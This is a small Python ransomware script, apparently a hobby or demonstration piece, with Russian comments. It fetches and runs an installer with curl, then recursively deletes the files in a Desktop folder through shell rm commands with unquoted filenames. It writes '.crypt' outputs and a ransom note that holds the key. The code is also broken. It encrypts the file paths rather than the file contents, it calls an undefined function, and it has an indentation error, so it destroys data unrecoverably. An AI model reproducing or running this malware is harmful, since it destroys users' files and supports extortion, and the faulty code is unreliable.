
import  os , simplecrypt ,  random # Импортирование библиотек simplecrypt не поставляется по умолчанию в python, но решение мы увидим ниже.
from getpass import getuser

user = getuser()
rut = "/home/user/Desktop/Test/"
ruta = rut.replace("user", user) # Мы получили имя пользователя
os.system("curl https://bootstrap.pypa.io/get-pip.py -o get-pip.py ; python get-pip.py ; pip install simplecrypt ; rm get-pip.py")# Команды, которые устанавливают книжный магазин Simplecrypt

longitud = 20
char = "abcdefghijklmnopqrstuvwyz1234567890"
password = ""
while longitud != 0:
	password += random.choice(char)# Мы генерируем случайный ключ из 20 символов со всеми буквами и цифрами.
	  longitud -= 1

def cifrar(carpeta):
	for archivo in os.listdir(carpeta):
		elementos = os.path.join(carpeta,archivo)
		if os.path.isdir(os.path.join(carpeta,archivo)):
			cifrar(os.path.join(carpeta,archivo)) # Мы находим все файлы в каталоге
		try:
			leer = open(elementos, "rb")
			interior = leer.read()
			os.system("rm " + elementos)
			archivofinal = simplecrypt.encrypt(elementos, password)
			directoriocifrado = elementos + ".crypt"
			abrir = open(directoriocifrado, "wb")
			abrir.write(archivofinal)
			abrir.close()# Мы шифруем, мы удаляем и записываем зашифрованный результат, если вы можете, потому что если вы найдете папку, вы не сможете зашифровать ее

		except:
			 variable = 0
			 variable -= 1# Делает что-то бесполезное, если находит то, что не может зашифровать


def recuperar():
	recuperar = open("Retrievefiles.txt", "w")
	recuperar.write("DAME MIS KIBABS y te los doy (^3^)")
	recuperar.write("\n")
	recuperar.write(password)
	recuperar.close()# Введите сообщение для восстановления, но также введите пароль.


cifrar("/home/linuxpower/Desktop/Test")
retrieve()# Вызов функций








	
